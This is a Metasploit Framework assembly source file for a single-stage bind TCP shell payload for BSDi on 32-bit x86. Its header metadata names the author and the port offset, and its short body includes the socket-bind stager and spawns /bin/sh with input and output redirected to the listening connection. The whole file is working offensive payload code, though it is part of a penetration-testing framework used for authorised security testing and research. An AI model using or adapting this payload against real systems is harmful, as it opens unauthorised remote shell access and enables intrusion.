;;
; 
;        Name: single_bind_tcp_shell
;     Version: $Revision: 1633 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Single portbind TCP shell.
;
; Meta-Information:
;
; meta-shortname=BSDi Bind TCP Shell
; meta-description=Listen on a port and spawn a shell
; meta-authors=skape <mmiller [at] hick.org>
; meta-os=bsdi
; meta-arch=ia32
; meta-category=single
; meta-connection-type=bind
; meta-name=bind_tcp_shell
; meta-basemod=Msf::PayloadComponent::BindConnection
; meta-offset-lport=0x1f
;;
BITS   32

%define  USE_SINGLE_STAGE 1

%include "generic.asm"
%include "stager_sock_bind.asm"

shell:
	execve_binsh EXECUTE_REDIRECT_IO
